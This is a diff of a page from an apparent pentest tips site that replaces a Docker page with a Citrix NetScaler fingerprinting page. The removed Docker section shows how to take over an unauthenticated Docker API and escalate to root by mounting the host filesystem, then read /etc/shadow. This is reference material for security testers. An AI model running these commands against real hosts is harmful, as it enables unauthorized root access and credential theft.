@@ -10,14 +10,14 @@
   
   <meta name="author" content="Vincent D. (@vincd)">
   <link rel="shortcut icon" href="../img/favicon.ico">
-  <title>Docker - Security Tips</title>
+  <title>Citrix - Security Tips</title>
   <link rel="stylesheet" href="../css/style.css" type="text/css" />
   
   <script>
     // Current page data
-    var mkdocs_page_name = "Docker";
-    var mkdocs_page_input_path = "docker.md";
-    var mkdocs_page_url = "/docker/";
+    var mkdocs_page_name = "Citrix";
+    var mkdocs_page_input_path = "citrix.md";
+    var mkdocs_page_url = "/citrix/";
   </script>
    
 </head>
@@ -70,24 +70,11 @@
           
           <li class="bold">
 		        
-    <span class="section-link active">Containers</span>
+    <span class="section-link ">Containers</span>
     <ul>
-                <li class="active">
+                <li class="">
                     
-    <a class="section-link" href="./">Docker</a>
-    <ul>
-            
-    
-    <ul>
-    
-        <li><a class="" href="#api">API</a></li>
-    
-        <li><a class="" href="#privilege-escalation">Privilege Escalation</a></li>
-    
-    </ul>
-    
-
-    </ul>
+    <a class="section-link" href="../docker/">Docker</a>
                 </li>
                 <li class="">
                     
@@ -267,15 +254,26 @@
           
           <li class="bold">
 		        
-    <span class="section-link ">Misc</span>
+    <span class="section-link active">Misc</span>
     <ul>
                 <li class="">
                     
     <a class="section-link" href="../firefox/">Firefox</a>
                 </li>
-                <li class="">
+                <li class="active">
                     
-    <a class="section-link" href="../citrix/">Citrix</a>
+    <a class="section-link" href="./">Citrix</a>
+    <ul>
+            
+    
+    <ul>
+    
+        <li><a class="" href="#citrix-netscaler-gateway">Citrix NetScaler Gateway</a></li>
+    
+    </ul>
+    
+
+    </ul>
                 </li>
                 <li class="">
                     
@@ -326,32 +324,15 @@
         <div role="main">
           <div class="section">
             
-              <h1 id="docker">Docker</h1>
-<h2 id="api">API</h2>
-<p>The docker API expose the port <code>2375</code>. This API can be used to interact with the docker engine which basically give ou the right to do anything you desire unauthenticated.</p>
-<p>To confirm that the host is running Docker you can make a GET requests to <code>/version</code> :</p>
-<pre><code class="language-http">http://&lt;host&gt;:&lt;port&gt;/version
-
-{&quot;Platform&quot;: {&quot;Name&quot;: &quot;&quot;}, &quot;Components&quot;: [{&quot;Name&quot;: &quot;Engine&quot;, &quot;Version&quot;: &quot;18.06.1-ce&quot;, &quot;Details&quot;: {&quot;ApiVersion&quot;: &quot;1.38&quot;, &quot;Arch&quot;: &quot;amd64&quot;, &quot;BuildTime&quot;: &quot;2018-10-26T23:39:57.000000000+00:00&quot;, &quot;Experimental&quot;: &quot;false&quot;, &quot;GitCommit&quot;: &quot;e68fc7a/18.06.1-ce&quot;, &quot;GoVersion&quot;: &quot;go1.10.3&quot;, &quot;KernelVersion&quot;: &quot;4.14.47-64.38.amzn2.x86_64&quot;, &quot;MinAPIVersion&quot;: &quot;1.12&quot;, &quot;Os&quot;: &quot;linux&quot;}}], &quot;Version&quot;: &quot;18.06.1-ce&quot;, &quot;ApiVersion&quot;: &quot;1.38&quot;, &quot;MinAPIVersion&quot;: &quot;1.12&quot;, &quot;GitCommit&quot;: &quot;e68fc7a/18.06.1-ce&quot;, &quot;GoVersion&quot;: &quot;go1.10.3&quot;, &quot;Os&quot;: &quot;linux&quot;, &quot;Arch&quot;: &quot;amd64&quot;, &quot;KernelVersion&quot;: &quot;4.14.47-64.38.amzn2.x86_64&quot;, &quot;BuildTime&quot;: &quot;2018-10-26T23:39:57.000000000+00:00&quot;}
+              <h1 id="citrix">Citrix</h1>
+<h2 id="citrix-netscaler-gateway">Citrix NetScaler Gateway</h2>
+<h3 id="fingerprint-netscaler-gateway">Fingerprint NetScaler Gateway</h3>
+<p>Download the following installer:</p>
+<pre><code class="language-none">https://{HOST}/epa/scripts/win/nsepa_setup.exe
 </code></pre>
-<p>Then, using the CLI you can execute commands, for instance:</p>
-<pre><code class="language-bash">$ docker -H &lt;host&gt;:&lt;port&gt; ps
-
-CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
-be2dd8aa8222        ubuntu:14.04        &quot;bash&quot;              5 years ago         Up 2 seconds                            silly_elion
-
-$ docker -H &lt;host&gt;:&lt;port&gt; exec -it &lt;container_name&gt; /bin/bash
-root@abc:/# whoami
-root
-</code></pre>
-<h2 id="privilege-escalation">Privilege Escalation</h2>
-<p>If the current user belong to the <code>docker</code> group then he can start a container
-with a binding to files own by root and read them:</p>
-<pre><code class="language-bash">docker run --it --rm -v /:/mnt alpine:latest /mnt sh
-</code></pre>
-<p>Inside the container shell he can read all the files as root:</p>
-<pre><code class="language-bash">cat /etc/shadow
-</code></pre>
+<p>Extract the binary <code>nsepa_setup.exe\nsepa.msi\nsepa.cab\nsepa.exe</code> and read the
+properties:</p>
+<p><img alt="Citrix NetScaller nsepa.exe version" src="../assets/citrix_netscaler_nsepa.exe_version.png" /></p>
             
           </div>
           <footer>
@@ -370,10 +351,10 @@ with a binding to files own by root and read them:</p>
     <span class="rst-current-version" data-toggle="rst-current-version">
       
       
-        <span><a href="../cloud/" style="color: #fcfcfc;">&laquo; Previous</a></span>
+        <span><a href="../firefox/" style="color: #fcfcfc;">&laquo; Previous</a></span>
       
       
-        <span style="margin-left: 15px"><a href="../kubernetes/" style="color: #fcfcfc">Next &raquo;</a></span>
+        <span style="margin-left: 15px"><a href="../git/" style="color: #fcfcfc">Next &raquo;</a></span>
       
     </span>
 </div>
